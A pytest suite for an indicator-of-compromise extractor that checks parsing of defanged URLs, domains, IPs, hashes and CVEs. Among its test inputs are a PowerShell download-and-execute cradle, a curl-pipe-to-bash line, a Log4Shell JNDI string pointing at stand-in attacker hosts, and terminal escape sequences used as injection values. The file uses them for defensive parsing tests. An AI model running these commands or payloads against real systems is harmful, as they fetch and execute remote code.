from __future__ import annotations

import ipaddress
from collections import Counter
from unittest import mock

import pytest

from ttprism import AnalysisOptions, IOCType, analyze_text, extract_iocs, refang
from ttprism.extract import (
    CODE_IDENTIFIERS,
    extract_into,
    find_technique_ids,
    is_reserved_ip,
    known_tlds,
    normalize_ip,
)
from ttprism.models import IOCCollector


def values(text: str, ioc_type: IOCType) -> list[str]:
    return [i.value for i in extract_iocs(text) if i.type == ioc_type]


def pairs(text: str) -> list[tuple[str, str]]:
    return [(str(i.type), i.value) for i in extract_iocs(text)]


def stats_for(text: str) -> Counter[str]:
    stats: Counter[str] = Counter()
    extract_into(IOCCollector(), text, "text", stats)
    return stats


# --------------------------------------------------------------------------- URLs


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("see https://evil.com/a/b.php?x=1.", ["https://evil.com/a/b.php?x=1"]),
        ("(https://evil.com/path)", ["https://evil.com/path"]),
        ("[link](https://evil.com/x)", ["https://evil.com/x"]),
        ("https://en.wikipedia.org/wiki/Foo_(bar)", ["https://en.wikipedia.org/wiki/Foo_(bar)"]),
        ("下載網址：https://evil.com/a作為第二階段", ["https://evil.com/a"]),
        ("網址 https://evil.com/a，請封鎖", ["https://evil.com/a"]),
        ("'http://evil.com/p.ps1')", ["http://evil.com/p.ps1"]),
        ("HTTP://EVIL.COM/Path", ["http://evil.com/Path"]),
        ("http://user:pw@evil.com:8080/x", ["http://user:pw@evil.com:8080/x"]),
        ("http://198.51.100.7:8443/gate", ["http://198.51.100.7:8443/gate"]),
        ("Visit http://198.51.100.7.", ["http://198.51.100.7"]),
        ("Visit http://evil.com.", ["http://evil.com"]),
        ("http://[2001:db8::1]/x", ["http://[2001:db8::1]/x"]),
        ("hxxps://cdn-update【.】com/stage2.bin", ["https://cdn-update.com/stage2.bin"]),
    ],
)
def test_urls(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.URL) == expected


@pytest.mark.parametrize(
    "text",
    ["http://nodot/", "http://evil.notatld/x", "http://evil.com:99999/", "http://999.1.1.1/"],
)
def test_invalid_urls_rejected(text: str) -> None:
    assert values(text, IOCType.URL) == []


def test_url_host_becomes_domain_or_ip() -> None:
    iocs = extract_iocs("http://evil.com/a http://198.51.100.9/b")
    assert ("domain", "evil.com") in [(i.type, i.value) for i in iocs]
    assert ("ipv4", "198.51.100.9") in [(i.type, i.value) for i in iocs]


# --------------------------------------------------------------------------- domains


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("C2 at evil.com, backup Evil-Backup.co.uk.", ["evil-backup.co.uk", "evil.com"]),
        ("攻擊者使用update-check.com作為C2", ["update-check.com"]),
        ("ｓｙｎｃ．ｅｘａｍｐｌｅ．ｎｅｔ", ["sync.example.net"]),
        ("evil.onion", ["evil.onion"]),
        ("xn--80ak6aa92e.xn--p1ai", ["xn--80ak6aa92e.xn--p1ai"]),
        # Not domains: unknown TLDs, file names, version strings.
        ("stage2.bin config.json invoice.pdf", []),
        ("libssl.so.3 version 1.2.3", []),
    ],
)
def test_domains(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.DOMAIN) == expected


def test_filename_like_domains_are_dropped_unless_url_host() -> None:
    assert values("payload.zip and setup.py and readme.md", IOCType.DOMAIN) == []
    assert values("https://payload.zip/x", IOCType.DOMAIN) == ["payload.zip"]
    # Three labels is not a file name.
    assert values("cdn.payload.zip", IOCType.DOMAIN) == ["cdn.payload.zip"]


def test_domain_not_taken_from_paths_or_emails() -> None:
    assert values(r"C:\Users\a\evil.com", IOCType.DOMAIN) == []
    assert values("first.name@evil.com", IOCType.DOMAIN) == []


# --------------------------------------------------------------------------- IPs


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("connects to 198.51.100.23:443", ["198.51.100.23"]),
        ("198.51.100[.]23", ["198.51.100.23"]),
        ("１９８．５１．１００．２３", ["198.51.100.23"]),
        ("IP:203.0.113.7。", ["203.0.113.7"]),
        ("256.1.1.1 1.2.3 1.2.3.4.5 v1.2.3.4 010.1.1.1", []),
        ("23.100.51.198.in-addr.arpa", []),
    ],
)
def test_ipv4(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.IPV4) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("2001:DB8:85a3:0:0:8a2e:370:7334", ["2001:db8:85a3::8a2e:370:7334"]),
        ("[2001:db8::7]:443", ["2001:db8::7"]),
        ("2001:db8:1::5.", ["2001:db8:1::5"]),
        ("::ffff:198.51.100.1", ["::ffff:198.51.100.1"]),
        # Not IPv6: MAC addresses, times, C++ scopes, two-group fragments.
        ("00:1A:2B:3C:4D:5E 12:30:45 std::string dead::beef", []),
    ],
)
def test_ipv6(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.IPV6) == expected


# --------------------------------------------------------------------------- hashes, emails, CVEs


def test_hashes() -> None:
    md5 = "5F89CEF4C9ED3F109BC7C400D822E60E"
    sha1 = "a2eebf3d37a530f407d8907e869f880fa5346b29"
    sha256 = "8ddcb559924bcba8d5497d45f66c01316bb77d5cf8618b9771e62166fdbbce05"
    text = f"MD5 {md5}\nSHA1:{sha1}\n雜湊值{sha256}。"
    assert values(text, IOCType.MD5) == [md5.lower()]
    assert values(text, IOCType.SHA1) == [sha1]
    assert values(text, IOCType.SHA256) == [sha256]


def test_hash_lookalikes_ignored() -> None:
    assert values("a" * 48, IOCType.MD5) == []  # wrong length
    assert values("1" * 32, IOCType.MD5) == []  # all digits
    assert values("0" * 64, IOCType.SHA256) == []  # one repeated character
    assert values("x" + "a1" * 16, IOCType.MD5) == []  # part of a longer token


def test_emails() -> None:
    text = "寄件者 Attacker［＠］Mail-Update．com and first.last+tag@evil.co.uk"
    assert values(text, IOCType.EMAIL) == ["attacker@mail-update.com", "first.last+tag@evil.co.uk"]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("CVE-2023-23397", ["CVE-2023-23397"]),
        ("cve-2021-44228", ["CVE-2021-44228"]),
        ("ＣＶＥ－２０２３－２３３９７", ["CVE-2023-23397"]),
        ("CVE–2021–40444", ["CVE-2021-40444"]),
        ("CVE-2024-1234567", ["CVE-2024-1234567"]),
        ("CVE-24-1234 CVE-2024-123 CVE-1899-1234", []),
    ],
)
def test_cves(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.CVE) == expected


# --------------------------------------------------------------------------- techniques


def test_technique_ids() -> None:
    text = (
        "T1059.001, T1566 and https://attack.mitre.org/techniques/T1055/012/ "
        "but not RT1234, T12345 or T1059.0011"
    )
    assert find_technique_ids(text) == ["T1059.001", "T1566", "T1055.012"]


def test_sources_and_dedup() -> None:
    iocs = extract_iocs("evil.com evil.com EVIL.COM", source="report")
    assert [(i.value, i.sources) for i in iocs] == [("evil.com", ("report",))]


# --------------------------------------------------------------------------- URL boundaries


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "Payload URLs: http://evil-a.com/wp/,http://evil-b.net/img/,http://198.51.100.9/x/",
            ["http://198.51.100.9/x/", "http://evil-a.com/wp/", "http://evil-b.net/img/"],
        ),
        (
            "$urls = @('http://evil-a.com/x','http://evil-b.com/y')",
            ["http://evil-a.com/x", "http://evil-b.com/y"],
        ),
        (
            'urls = ["http://evil-a.com/x","http://evil-b.com/y"]',
            ["http://evil-a.com/x", "http://evil-b.com/y"],
        ),
        ("http://evil.com/a;http://evil2.com/b", ["http://evil.com/a", "http://evil2.com/b"]),
        ("http://evil.com/a|http://evil2.com/b", ["http://evil.com/a", "http://evil2.com/b"]),
        ("(http://evil.com/a)(https://evil2.com/b)", ["http://evil.com/a", "https://evil2.com/b"]),
        (
            "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1');Start-Sleep 1",
            ["http://evil.com/a.ps1"],
        ),
        ("curl -s http://evil.com/x.sh&&bash x.sh", ["http://evil.com/x.sh"]),
        ("[https://evil.com/x](https://evil.com/x)", ["https://evil.com/x"]),
        ("[hxxps://evil[.]com/x](hxxps://evil[.]com/x)", ["https://evil.com/x"]),
        # ';' alone is a valid path character and does not end a URL.
        ("http://evil.com/a;jsessionid=1", ["http://evil.com/a;jsessionid=1"]),
        ("'http://evil.com/a'+'http://b.evil.com/c'", ["http://b.evil.com/c", "http://evil.com/a"]),
    ],
)
def test_url_lists_are_split(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.URL) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("**https://evil-cdn.net/payload.bin**", ["https://evil-cdn.net/payload.bin"]),
        ("*https://evil-cdn.net/a*.", ["https://evil-cdn.net/a"]),
        ("~~https://evil.com/old~~", ["https://evil.com/old"]),
        ("~~Old C2: https://evil.com/old~~ and more", ["https://evil.com/old"]),
        ("see https://evil-cdn.net/x[1] and", ["https://evil-cdn.net/x"]),
        ("see https://evil-cdn.net/x[12].", ["https://evil-cdn.net/x"]),
        ("https://evil-cdn.net/a&gt;", ["https://evil-cdn.net/a"]),
        (
            "&lt;https://evil-cdn.net/a&gt; and &quot;https://evil.com/b&quot;",
            ["https://evil-cdn.net/a", "https://evil.com/b"],
        ),
        ("https://evil.com/?a=1&amp;", ["https://evil.com/?a=1"]),
        ("https://evil.com/q&#39;", ["https://evil.com/q"]),
        # Not markup: kept.
        (
            "https://evil.com/a?x[1]=2 https://evil.com/~user~~ https://evil.com/?a=1&amp;b=2",
            [
                "https://evil.com/?a=1&amp;b=2",
                "https://evil.com/a?x[1]=2",
                "https://evil.com/~user~~",
            ],
        ),
    ],
)
def test_url_tail_markup_is_stripped(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.URL) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (
            "${jndi:ldap://attacker-ldap.com:1389/Exploit}",
            ("ldap://attacker-ldap.com:1389/Exploit", "attacker-ldap.com"),
        ),
        ("${jndi:rmi://evil-rmi.net/a}", ("rmi://evil-rmi.net/a", "evil-rmi.net")),
        ("tcp://c2-relay.net:4444", ("tcp://c2-relay.net:4444", "c2-relay.net")),
        ("udp://c2-relay.net:53", ("udp://c2-relay.net:53", "c2-relay.net")),
        ("smb://files.evil-share.net/x", ("smb://files.evil-share.net/x", "files.evil-share.net")),
        ("file://attacker.com/share/x.dll", ("file://attacker.com/share/x.dll", "attacker.com")),
        ("ssh://root@evil-ssh.net:2222", ("ssh://root@evil-ssh.net:2222", "evil-ssh.net")),
        ("telnet://evil.com", ("telnet://evil.com", "evil.com")),
        ("irc://irc.evil.net:6667/#chan", ("irc://irc.evil.net:6667/#chan", "irc.evil.net")),
        ("rtsp://evil.com/x", ("rtsp://evil.com/x", "evil.com")),
        ("dns://evil.com", ("dns://evil.com", "evil.com")),
        ("iiop://evil.com:900/x", ("iiop://evil.com:900/x", "evil.com")),
        ("ldaps://evil.com/x ftps://evil.com/y", ("ldaps://evil.com/x", "evil.com")),
        ("hxxp[s]://evil.com/x", ("https://evil.com/x", "evil.com")),
    ],
)
def test_other_url_schemes(text: str, expected: tuple[str, str]) -> None:
    url, domain = expected
    assert url in values(text, IOCType.URL)
    assert values(text, IOCType.DOMAIN) == [domain]


def test_file_url_without_host_is_ignored() -> None:
    assert pairs("file:///C:/Users/a/evil.com") == []


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        (r"\\attacker-server.com\share\file", ["attacker-server.com"]),
        (r"net use Z: \\files.evil-share.net\c$", ["files.evil-share.net"]),
        ('<script src="//cdn.evil-js.com/x.js">', ["cdn.evil-js.com"]),
        ("//cdn.evil-js.com/x.js", ["cdn.evil-js.com"]),
        ("redirect=//evil.com/x", ["evil.com"]),
        ("*.evil.com", ["evil.com"]),
        ("Wildcard: *.duckdns.org and .evil.com", ["duckdns.org", "evil.com"]),
        ("(.evil.com)", ["evil.com"]),
        # Path segments, not hosts.
        ("/var/www/evil.com/index.php", []),
        (r"C:\Users\a\evil.com", []),
        (r"C:\\Users\\a\\evil.com", []),
        ("path//evil.com", []),
        ("unknown://evil.com", []),
        ("file:///evil.com/x", []),
        ("a.b..evil.com", []),
    ],
)
def test_unc_protocol_relative_and_wildcard_hosts(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.DOMAIN) == expected


@pytest.mark.parametrize(
    ("text", "url", "domain"),
    [
        (
            "http://my_bucket.s3.amazonaws.com/x.exe",
            "http://my_bucket.s3.amazonaws.com/x.exe",
            "my_bucket.s3.amazonaws.com",
        ),
        ("http://my_host.evil.com/x", "http://my_host.evil.com/x", "my_host.evil.com"),
        ("_http://evil.com_", "http://evil.com", "evil.com"),
    ],
)
def test_underscore_in_url_host(text: str, url: str, domain: str) -> None:
    assert values(text, IOCType.URL) == [url]
    assert values(text, IOCType.DOMAIN) == [domain]


def test_underscore_not_accepted_in_bare_domains_or_tld() -> None:
    assert pairs("my_host.evil.com") == []
    assert pairs("http://evil.co_m/x") == []


@pytest.mark.parametrize(
    "text",
    [
        "http://evil-cdn.net:443123/x",
        "http://evil.com:123456/x",
        "http://evil.com:0/x",
        "http://evil.com:65536",
    ],
)
def test_out_of_range_port_rejects_url(text: str) -> None:
    assert values(text, IOCType.URL) == []


def test_ipv6_url_hosts_are_normalised() -> None:
    text = "http://[2001:DB8::1]/a http://[2001:db8:0:0:0:0:0:1]/a http://[2001:db8::1]/a"
    assert pairs(text) == [("url", "http://[2001:db8::1]/a"), ("ipv6", "2001:db8::1")]
    assert pairs("http://[::ffff:c633:6401]/x") == [
        ("url", "http://[::ffff:198.51.100.1]/x"),
        ("ipv6", "::ffff:198.51.100.1"),
    ]


def test_bracketed_ipv6_host_needs_no_three_groups() -> None:
    assert pairs("http://[2600::1]/x") == [("url", "http://[2600::1]/x"), ("ipv6", "2600::1")]
    assert pairs("http://[::1]:8080/") == [("url", "http://[::1]:8080/"), ("ipv6", "::1")]
    assert values("http://[1.2.3.4]/x http://[12]/", IOCType.URL) == []


# --------------------------------------------------------------------------- encoded and embedded URLs


def test_open_redirect_target_is_extracted_and_outer_url_kept() -> None:
    text = "https://www.google.com/url?q=https://evil-phish.com/login&sa=D"
    # "&sa=D" belongs to the wrapper: a redirector reads it as its own parameter.
    assert values(text, IOCType.URL) == ["https://evil-phish.com/login", text]
    assert values(text, IOCType.DOMAIN) == ["evil-phish.com", "www.google.com"]
    assert values("https://t.co/x?u=http://evil-phish.com/a", IOCType.DOMAIN) == ["evil-phish.com", "t.co"]


def test_percent_encoded_url_in_query_is_decoded() -> None:
    text = (
        "https://nam02.safelinks.protection.outlook.com/?url=https%3A%2F%2Fphish-target.com%2Flogin&data=05"
    )
    assert values(text, IOCType.URL) == [text, "https://phish-target.com/login"]
    assert values(text, IOCType.DOMAIN) == ["nam02.safelinks.protection.outlook.com", "phish-target.com"]
    encoded = "http://redir.evil-cdn.net/r?u=http%3A%2F%2F198.51.100.7%2Fx&m=mailto%3Aops%40evil-mail.com"
    assert ("ipv4", "198.51.100.7") in pairs(encoded)
    assert ("url", "http://198.51.100.7/x") in pairs(encoded)
    assert ("email", "ops@evil-mail.com") in pairs(encoded)


def test_decoding_is_one_level_deep() -> None:
    double = "http://a.evil.com/?u=http%253A%252F%252Fb.evil.com%252Fx"
    assert values(double, IOCType.URL) == [double]
    assert values(double, IOCType.DOMAIN) == ["a.evil.com", "b.evil.com"]
    nested = "http://a.evil.com/?u=http%3A%2F%2Fb.evil.com%2F%3Fu%3Dhttp%253A%252F%252Fc.evil.com"
    assert values(nested, IOCType.URL) == [nested, "http://b.evil.com/?u=http%3A%2F%2Fc.evil.com"]
    assert values(nested, IOCType.DOMAIN) == ["a.evil.com", "b.evil.com", "c.evil.com"]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("%2Fphish-target.com", [("domain", "phish-target.com")]),
        ("https%3A%2F%2Fevil.com%2Fx", [("domain", "evil.com")]),
        ("user%40evil-mail.com", [("domain", "evil-mail.com")]),
        ("https%3A%2F%2F198.51.100.7%2Fx", [("ipv4", "198.51.100.7")]),
        ("x=%201.2.3.4", [("ipv4", "1.2.3.4")]),
        ("%252Fevil.com", [("domain", "evil.com")]),
        ("%2F-evil.com", []),
    ],
)
def test_percent_escape_before_name(text: str, expected: list[tuple[str, str]]) -> None:
    assert pairs(text) == expected


def test_url_userinfo_is_not_an_email() -> None:
    assert values("ftp://backup:Winter2024@files.evil-store.net/up/", IOCType.EMAIL) == []
    assert values("http://user:pw@evil.com:8080/x", IOCType.EMAIL) == []
    assert values("ftp://anonymous@files.evil.com/x", IOCType.EMAIL) == []
    # Rejected URLs still have userinfo.
    assert values("http://user:pw@evil.com:99999/x", IOCType.EMAIL) == []
    # E-mail addresses elsewhere, also in a URL's query, are kept.
    text = "ftp://a:b@files.evil.com/ ops@evil.com https://evil.com/?to=admin@evil.com"
    assert values(text, IOCType.EMAIL) == ["admin@evil.com", "ops@evil.com"]


# --------------------------------------------------------------------------- non-ASCII neighbours


@pytest.mark.parametrize(
    "text",
    [
        "micros\u043eft.com",  # Cyrillic o
        "http://micros\u043eft.com/login",
        "\u0430pple.com",  # Cyrillic a
        "phishing domain \u0440\u0430ypal.com",
        "the attacker used micros\u043eft-update.com",
        "b\u00fccher.de",
        "bu\u0308cher.de",  # decomposed u + combining diaeresis
        "C2: b\u00fccher-update.de and https://m\u00fcnchen.de/x and mail admin@stra\u00dfe.de",
        "p\u03b1ypal.com",  # Greek alpha
        "evil.com\u00e9",
        "http://evil.com\u00e9/x",
        "\u0430dmin@evil.com",
        "b\u00fc.evil.com",
    ],
)
def test_domain_glued_to_other_letters_is_not_truncated(text: str) -> None:
    assert pairs(text) == []


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("\u653b\u64ca\u8005\u4f7f\u7528evil.com\u4f5c\u70baC2", [("domain", "evil.com")]),
        ("\u9023\u7dda\u81f3evil-c2.net\u3002", [("domain", "evil-c2.net")]),
        (
            "\u30b5\u30fc\u30d0\u30fcevil.com\u306b\u63a5\u7d9a",
            [("domain", "evil.com")],
        ),  # Katakana, Hiragana
        ("\uc11c\ubc84evil.com\uc5d0", [("domain", "evil.com")]),  # Hangul
        ("\u3105evil.com", [("domain", "evil.com")]),  # Bopomofo
        ("\uff76\uff9eevil.com", [("domain", "evil.com")]),  # half-width Katakana with voiced mark
        (
            "\u0e40\u0e0b\u0e34\u0e23\u0e4c\u0e1f\u0e40\u0e27\u0e2d\u0e23\u0e4cevil.com",
            [("domain", "evil.com")],
        ),
        ("\u5bc4\u4ef6\u8005ops@evil.com\u3002", [("email", "ops@evil.com")]),
        (
            "\u7db2\u5740https://evil.com/a\u4f5c\u70ba",
            [("url", "https://evil.com/a"), ("domain", "evil.com")],
        ),
        ("\u2460evil-one.com\u2461evil-two.net", [("domain", "evil-one.com"), ("domain", "evil-two.net")]),
        ("evil.com\u00b2 \u00e9 evil.net", [("domain", "evil.com"), ("domain", "evil.net")]),
    ],
)
def test_domain_next_to_spaceless_scripts_and_symbols_is_found(
    text: str, expected: list[tuple[str, str]]
) -> None:
    assert pairs(text) == expected


# --------------------------------------------------------------------------- compatibility characters


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("C2 45.77.123.9\u00b2 (see note)", [("ipv4", "45.77.123.9")]),
        ("CVE-2021-40444\u00b9", [("cve", "CVE-2021-40444")]),
        (
            "C2\uff1a\u2460evil-one.com \u2461evil-two.net \u246245.77.123.9",
            [("domain", "evil-one.com"), ("domain", "evil-two.net"), ("ipv4", "45.77.123.9")],
        ),
        ("\u2488evil-one.com", [("domain", "evil-one.com")]),
        ("5f89cef4c9ed3f109bc7c400d822e60e\u00b2", [("md5", "5f89cef4c9ed3f109bc7c400d822e60e")]),
        ("C2 server: login\u2011microsoftonline.com", [("domain", "login-microsoftonline.com")]),
        ("secure\u2010bank\u2010login.com", [("domain", "secure-bank-login.com")]),
        (
            "https://cdn\u2011update.com/x",
            [("url", "https://cdn-update.com/x"), ("domain", "cdn-update.com")],
        ),
        ("ev\u200eil-cdn.net evil\u202e.com", [("domain", "evil-cdn.net"), ("domain", "evil.com")]),
        ("CVE\u22122021\u221244228", [("cve", "CVE-2021-44228")]),
    ],
)
def test_superscripts_circled_digits_and_hyphens(text: str, expected: list[tuple[str, str]]) -> None:
    assert pairs(text) == expected


def test_superscript_footnotes_after_technique_ids() -> None:
    assert find_technique_ids("PowerShell (T1059.001\u00b9) and T1105\u00b2") == ["T1059.001", "T1105"]


def test_cve_regex_accepts_minus_sign_without_refang() -> None:
    collector = IOCCollector()
    extract_into(collector, "CVE\u22122021\u221244228", "cape:commands")
    assert [(t, v) for t, v, _ in collector] == [(IOCType.CVE, "CVE-2021-44228")]


# --------------------------------------------------------------------------- bare-name noise


@pytest.mark.parametrize("name", sorted(CODE_IDENTIFIERS))
def test_code_identifiers_are_not_domains(name: str) -> None:
    # Each entry ends in a real TLD; otherwise it would not need listing.
    assert name.rsplit(".", 1)[1] in known_tlds()
    assert pairs(name) == []
    assert pairs(name.upper()) == []
    assert stats_for(name) == Counter({"code_identifier": 1})
    # As a URL host the name is kept.
    assert ("domain", name) in pairs(f"http://{name}/x")


@pytest.mark.parametrize(
    "text",
    [
        'CreateObject("WScript.Shell")',
        'Set s = CreateObject("ADODB.Stream")',
        "ASP.NET web shell",
        "[System.Net]::SecurityProtocol",
        "New-Object -ComObject WScript.Network",
        "VB.NET and ADO.NET",
    ],
)
def test_code_identifiers_in_context(text: str) -> None:
    assert pairs(text) == []


def test_double_extension_file_names_are_dropped() -> None:
    text = "invoice.pdf.zip document.doc.zip photo.jpg.mov setup.exe.app report.docx.zip"
    assert pairs(text) == []
    assert stats_for(text) == Counter({"filename_like_domain": 5})
    # The middle label must be a file extension, and the TLD a file-extension TLD.
    assert values("cdn.payload.zip invoice.pdf.com files.pdf.evil.zip", IOCType.DOMAIN) == [
        "cdn.payload.zip",
        "files.pdf.evil.zip",
        "invoice.pdf.com",
    ]
    assert values("https://invoice.pdf.zip/x", IOCType.DOMAIN) == ["invoice.pdf.zip"]


@pytest.mark.parametrize(
    "text",
    [
        "co.uk com.tw gov.tw ac.jp go.kr ne.jp or.kr mil.tw org.tw edu.tw net.cn",
        "CO.UK and Com.Tw",
        # Leading dots and full-width or bracketed dots.
        ".co.uk .com.tw",
        "．co．uk",
        "後綴是com【.】tw的網域",
    ],
)
def test_public_suffixes_are_not_domains(text: str) -> None:
    assert pairs(text) == []
    assert set(stats_for(refang(text))) == {"public_suffix"}


def test_names_under_public_suffixes_are_kept() -> None:
    text = "evil.co.uk www.gov.tw .evil.com.tw *.evil.co.jp"
    assert values(text, IOCType.DOMAIN) == ["evil.co.jp", "evil.co.uk", "evil.com.tw", "www.gov.tw"]
    assert stats_for(text) == Counter()
    # Not public suffixes: a TLD longer than two letters, or another first label.
    assert values("co.com go.dev edu.au.example.com cdn.tw", IOCType.DOMAIN) == [
        "cdn.tw",
        "co.com",
        "edu.au.example.com",
        "go.dev",
    ]
    # As a URL host the name is kept.
    assert values("https://co.uk/x", IOCType.DOMAIN) == ["co.uk"]


# --------------------------------------------------------------------------- e-mail local parts


@pytest.mark.parametrize(
    "text",
    [
        "j...@gmail.com",
        "...@evil.com",
        "-@evil.com",
        "+@evil.com",
        ".user@evil.com",
        "a.b.@evil.com",
        "user..name@evil.com",
    ],
)
def test_invalid_email_local_parts_are_rejected(text: str) -> None:
    assert values(text, IOCType.EMAIL) == []


def test_valid_email_local_parts() -> None:
    text = "a@evil.com first.last+tag@evil.com x_y-z@evil.com 1@evil.com"
    assert values(text, IOCType.EMAIL) == [
        "1@evil.com",
        "a@evil.com",
        "first.last+tag@evil.com",
        "x_y-z@evil.com",
    ]


# --------------------------------------------------------------------------- IP details


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("C2\u5730\u5740\u4e3a2001:db8:85a3::7334\uff1a\u7528\u4e8e\u901a\u4fe1", ["2001:db8:85a3::7334"]),
        (
            "IPv6\u4f4d\u5740\uff1a2a03:2880:f12f:83:face:b00c:0:25de\uff1a\u4e3b\u8981C2",
            ["2a03:2880:f12f:83:face:b00c:0:25de"],
        ),
        ("Address 2001:db8:85a3::7334: was used", ["2001:db8:85a3::7334"]),
        ("2001:db8:1::: x", ["2001:db8:1::"]),
        ("\u5730\u5740\uff1a2001:db8::7 (:2001:db8::8)", ["2001:db8::7", "2001:db8::8"]),
        ("\u5730\u5740\uff1a2001:db8:1::", ["2001:db8:1::"]),
    ],
)
def test_ipv6_followed_by_colon(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.IPV6) == expected


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("C2:2001:db8::1", ["2001:db8::1"]),
        ("c2:2400:cb00::1 and beef:2001:db8::2", ["2001:db8::2", "2400:cb00::1"]),
        ("C2：2001:db8::1。", ["2001:db8::1"]),
        ("C2:2001:db8::1: was used", ["2001:db8::1"]),
        ("C2:2001:db8:0:0:0:0:0:1", ["2001:db8::1"]),
        # The first group is numeric, not a word: still outside 2000::/3.
        ("2a:2001:db8::1", ["2001:db8::1"]),
        # Kept whole: the first group is in 2000::/3, the rest is not in it, or
        # the whole is a ULA, link-local or multicast address.
        ("2001:db8::1 2400:2001:db8::1", ["2001:db8::1", "2400:2001:db8::1"]),
        ("c2:fd00::1 dead:beef::1", ["c2:fd00::1", "dead:beef::1"]),
        (
            "fd12:3456:789a::1 fe80:2001:db8::1 ff0e:2001:db8::1",
            ["fd12:3456:789a::1", "fe80:2001:db8::1", "ff0e:2001:db8::1"],
        ),
        # Without the label the rest has only seven groups: not an address.
        ("c2:2001:db8:1:2:3:4:5", ["c2:2001:db8:1:2:3:4:5"]),
    ],
)
def test_ipv6_after_hex_label(text: str, expected: list[str]) -> None:
    assert values(text, IOCType.IPV6) == expected


@pytest.mark.parametrize(
    "value",
    [
        "fe80::1%eth0",
        "2606:4700:4700::1111%\x1b]0;PWNED\x07\x1b[2J",
        "[2a00:1450:4001::200e%\x1b[31mRED]",
        "1.2.3.4%x",
    ],
)
def test_scoped_addresses_are_rejected(value: str) -> None:
    assert normalize_ip(value) is None


@pytest.mark.parametrize(
    "value",
    [
        "0.1.2.3",
        "10.1.2.3",
        "100.64.0.1",
        "127.0.0.1",
        "169.254.1.1",
        "172.16.0.1",
        "192.0.0.9",
        "192.0.2.1",
        "192.88.99.1",
        "192.168.1.1",
        "198.18.0.1",
        "198.51.100.1",
        "203.0.113.1",
        "224.0.0.1",
        "240.0.0.1",
        "255.255.255.255",
        "::",
        "::1",
        "64:ff9b:1::1",
        "100::1",
        "2001::1",
        "2001:db8::1",
        "3fff::1",
        "5f00::1",
        "fc00::1",
        "fe80::1",
        "ff02::1",
        "::ffff:10.0.0.1",
        "::ffff:198.51.100.1",
    ],
)
def test_reserved_ips(value: str) -> None:
    assert is_reserved_ip(value)


@pytest.mark.parametrize(
    "value",
    [
        "8.8.8.8",
        "45.77.123.9",
        "2606:4700:4700::1111",
        "2a03:2880:f12f:83:face:b00c:0:25de",
        "::ffff:8.8.8.8",
    ],
)
def test_global_ips_are_not_reserved(value: str) -> None:
    assert not is_reserved_ip(value)


def test_reserved_ips_do_not_depend_on_python_tables() -> None:
    # Python 3.12.3 regarded 3fff::/20 (RFC 9637 documentation) as global.
    with (
        mock.patch.object(ipaddress.IPv4Address, "is_global", property(lambda self: True)),
        mock.patch.object(ipaddress.IPv6Address, "is_global", property(lambda self: True)),
    ):
        assert is_reserved_ip("3fff::1")
        assert is_reserved_ip("2001:db8::1")
        assert is_reserved_ip("198.51.100.1")
        assert is_reserved_ip("::ffff:192.168.0.1")
        assert not is_reserved_ip("8.8.8.8")


# --------------------------------------------------------------------------- second review of 1a13871


def everything(text: str) -> list[tuple[str, str]]:
    """IOCs after refanging and reserved/allowlist filtering, with reserved values kept."""
    return [(str(i.type), i.value) for i in analyze_text(text, AnalysisOptions(include_reserved=True)).iocs]


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        # SQL/WQL LIKE wildcards are not percent escapes.
        ("CommandLine LIKE '%198.51.100.7%'", [("ipv4", "198.51.100.7")]),
        ("like '%10.0.0.5%'", [("ipv4", "10.0.0.5")]),
        ("LIKE '%cafe-cdn.example.com%'", [("domain", "cafe-cdn.example.com")]),
        # Escapes of separators still are, single and double encoded.
        ("x=%201.2.3.4", [("ipv4", "1.2.3.4")]),
        ("%252F198.51.100.7 ip%253D198.51.100.7", [("ipv4", "198.51.100.7")]),
        # Other escapes are characters glued to the value: "%41" is "A".
        ("%41198.51.100.7", []),
    ],
)
def test_percent_signs_before_values(text: str, expected: list[tuple[str, str]]) -> None:
    assert everything(text) == expected


def test_user_agent_versions_are_not_addresses() -> None:
    ua = "UA: Mozilla/5.0 (Windows NT 10.0) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0 YaBrowser/24.1.0.0"
    result = analyze_text(ua + " Chrome%2F131.0.0.0", AnalysisOptions(include_reserved=True))
    assert result.iocs == []
    assert result.suppressed == {"version_like": 4}
    # An address after a URL's "/" or with a prefix length is still one.
    assert everything("http://120.0.0.0/x 203.0.113.5/24") == [
        ("url", "http://120.0.0.0/x"),
        ("ipv4", "120.0.0.0"),
        ("ipv4", "203.0.113.5"),
    ]


@pytest.mark.parametrize(
    "value",
    [
        "fec0:0:0:ffff::1",
        "dead:beef:cafe::1",
        "1:2:3:4:5:6:7:8",
        "2002:c000:201::1",
        "::1.2.3.4",
        "64:ff9b::c000:201",
    ],
)
def test_ipv6_outside_global_unicast_is_reserved(value: str) -> None:
    # Only 2000::/3 is global unicast; NAT64 addresses are judged by the IPv4 address they carry.
    assert is_reserved_ip(value)
    assert [i for i in analyze_text(value).iocs if i.type == IOCType.IPV6] == []


def test_reserved_ips_ignore_python_is_global() -> None:
    with (
        mock.patch.object(ipaddress.IPv6Address, "is_global", True),
        mock.patch.object(ipaddress.IPv4Address, "is_global", False),
    ):
        assert is_reserved_ip("2002:c000:201::1")
        assert not is_reserved_ip("8.8.8.8")
